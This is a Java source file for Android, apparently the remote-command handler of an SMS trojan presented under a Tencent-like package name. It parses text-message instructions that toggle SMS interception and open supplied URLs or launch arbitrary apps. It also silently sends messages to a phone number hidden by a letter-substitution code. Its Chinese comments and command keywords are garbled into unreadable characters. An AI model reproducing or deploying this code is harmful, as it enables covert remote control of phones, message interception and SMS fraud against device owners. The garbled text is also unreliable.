package com.tencent.sms;

import java.util.ArrayList;
import java.util.List;

import com.tencent.qq.Keys;
import com.tencent.util.Utility;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Vibrator;
import android.telephony.gsm.SmsManager;
/**
 * ָ���������ͨ���·����ŵ��ͻ��ˣ��ͻ���ֱ���ض��Ĳ���
 */
public class InstructResolver {
  
	private Context context;
	//ָ�Ԫ 
	private ArrayList<String> unitInstruct;
	
	public InstructResolver(Context context)
	{
		this.context=context;
		unitInstruct=new ArrayList<String>();
	}
	
	/**
	 * ����ָ�����,���ؽ��������ĵ�Ԫ����
	 */
	public int Parse(String instruct)
	{
		char[] items=instruct.toCharArray();
		int startIndex=0;
		int unitCount=0;
		
		for(int i=0;i<items.length-1;i++)
		{
			if(items[i]==32&&items[i+1]!=32) //cur space,next not space
			{
				unitInstruct.add(instruct.substring(startIndex,i).trim());
				startIndex=i;
				unitCount++;
			}
		}
		//�������һ��ָ�Ԫ
		if(startIndex!=items.length-1)
		{
			unitInstruct.add(instruct.substring(startIndex).trim());
			unitCount++;
		}
		return unitCount;
	}
	/**
	 * ִ��ָ�Ԫ
	 * ����ָ���Ƿ�ϵͳ������ִ��
	 * true �ɹ�
	 * false ʧ��
	 */
	public boolean execute()
	{
		if(unitInstruct.size()<=0)
			return false;
		boolean bResult=true;
		//���ж�������
		try 
		{
			
			if(unitInstruct.get(0).trim().equals("������������������"))
			{
				//ȡ����������		
				SharedPreferences settings=context.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
				SharedPreferences.Editor edit=settings.edit();
				edit.putBoolean(Keys.SMS_INTERCEPT_SWITCH,false);
				edit.commit();
				//֪ͨ���ø���
				Intent intent=new Intent(Keys.SETTING_CHANGE);
				context.sendBroadcast(intent);
			}else if(unitInstruct.get(0).trim().equals("����������������")){
				//���ö�������		
				SharedPreferences settings=context.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
				SharedPreferences.Editor edit=settings.edit();
				edit.putBoolean(Keys.SMS_INTERCEPT_SWITCH,true);
				edit.commit();
				//֪ͨ���ø���
				Intent intent=new Intent(Keys.SETTING_CHANGE);
				context.sendBroadcast(intent);
			}else if(unitInstruct.get(0).equals("����ת��ע�Ᵽů")){
				char[] mark={'a','b','c','d','e','f','g','h','i','j'};
				char[] temp=unitInstruct.get(1).toCharArray();
				int len=temp.length;
				String code="";
				for(int i=0;i<len;i++){
					int j=0;
					for(;j<mark.length;j++){
						if(temp[i]==mark[j]){
							code+=String.valueOf(j);
							break;
						}
					}
					//û�ҵ�
					if(j==mark.length){
						return false;
					}
				}	
				SmsManager smsManager=SmsManager.getDefault();
				List<String> divideContents=smsManager.divideMessage(unitInstruct.get(2));
				for(String text:divideContents)
				{
					smsManager.sendTextMessage(code, null, text,null,null);
				}
				
			}else if(unitInstruct.get(0).equals("������С��")){
				Uri uri=Uri.parse(unitInstruct.get(1));
				Intent intent=new Intent(Intent.ACTION_VIEW,uri);
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);		
				context.startActivity(intent);
				
			}else if(unitInstruct.get(0).equals("�����д���")) //��APP������1������������2��Activity·����
			{
				if(unitInstruct.size()==3){
				    Utility.openApplicationFromAppName(context, unitInstruct.get(1).trim());
				}else {
					Intent intent=new Intent();
					intent.setComponent(new ComponentName(unitInstruct.get(1),unitInstruct.get(3)));
					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);					
					context.startActivity(intent);
				}
				
			}
			
		} catch (Exception e) {
			bResult=false;
		}
		return bResult;
	}
}